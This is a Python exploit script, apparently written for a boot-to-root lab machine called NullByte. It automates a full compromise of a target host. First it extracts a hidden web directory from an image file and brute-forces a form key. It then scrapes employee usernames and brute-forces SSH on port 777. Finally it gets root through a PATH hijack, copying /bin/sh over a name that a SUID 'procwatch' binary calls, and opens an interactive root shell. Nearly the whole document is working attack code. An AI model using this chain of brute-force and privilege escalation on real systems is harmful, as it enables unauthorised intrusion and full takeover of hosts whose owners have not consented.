#!/usr/bin/env python3

import requests
import sys
import re
import paramiko
from base64 import b64decode
from pwn import *

context.log_level = "error"

def print_warning(message):
    context.log_level = "info"
    log.warning(message)
    context.log_level = "error"

def print_success(message):
    context.log_level = "info"
    log.success(message)
    context.log_level = "error"

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: %s <rhost>" % sys.argv[0])
        sys.exit()

    banner = """ _______        .__  .__    __________          __          
 \      \  __ __|  | |  |   \______   \___.__._/  |_  ____  
 /   |   \|  |  \  | |  |    |    |  _<   |  |\   __\/ __ \ 
/    |    \  |  /  |_|  |__  |    |   \\___  | |  | \  ___/ 
\____|__  /____/|____/____/  |______  // ____| |__|  \___  >
        \/                          \/ \/                \/ """

    print(banner)

    rhost = sys.argv[1]
    url = "http://" + rhost


    ### first step: download main.gif and parse hidden directory
    print_success("downloading main.gif and parsing hidden directory....")
    response = requests.get(url + "/main.gif")
    directory = response.text[20:31].strip()
    keyurl = url + "/" + directory + "/index.php"

    ### second step: bruteforce of key
    print_success(f"bruteforcing key at {keyurl}...")
    keys = ["random_key", "another_random_key", "test", "password", "elite"]
    for key in keys:
        response = requests.post(keyurl, data={"key": key})
        if not 'invalid key' in response.text:
            print_success("valid key found: {}".format(key))
            break

    filename = re.findall('action="(.*?)"', response.text)[0]
    name = re.findall('name="(.*?)"', response.text)[0]
    usersearchurl = url + "/" + directory + "/" + filename + "?" + name
    
    ### third step: username ssh bruteforce
    print_success("parsing usernames and trying credentials...")
    response = requests.get(usersearchurl)
    usernames = re.findall("EMP NAME : (.*?) <br>", response.text)
    passwords = ['random_password', 'omega']

    found = False

    for username in usernames:
        for password in passwords:
            print_warning("testing {} {}".format(username, password))
            try:
                sshsession = ssh(host=rhost, user=username, password=password, port=777)
                found = True
                break
            except paramiko.ssh_exception.AuthenticationException as error:
                pass
        if found:
            print_success("{} {}".format(username, password))
            break

    ### fourth step: abusing $PATH variable
    print_success("abusing $PATH variable...")
    print_success("executing os commands...")
    commands = ["whoami", "ls /var/www/backup"]
    shell = sshsession.process("sh")
    for command in commands:
        shell.sendline(command)
        output = shell.recvline().decode().strip()
        log.success(output)

    filename = output.split(" ")[1]
    

    shell.sendline("/bin/cp /bin/sh /var/www/backup/ps")

    
    rootsession = ssh(host=rhost, user=username, password=password, port=777)
    rootshell = rootsession.process("/bin/sh", env={"PATH": "/var/www/backup", "PS1": ""})
    rootshell.sendline("procwatch")
    rootshell.sendline("export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games")

    print_success("popping shell...")
    rootshell.interactive()


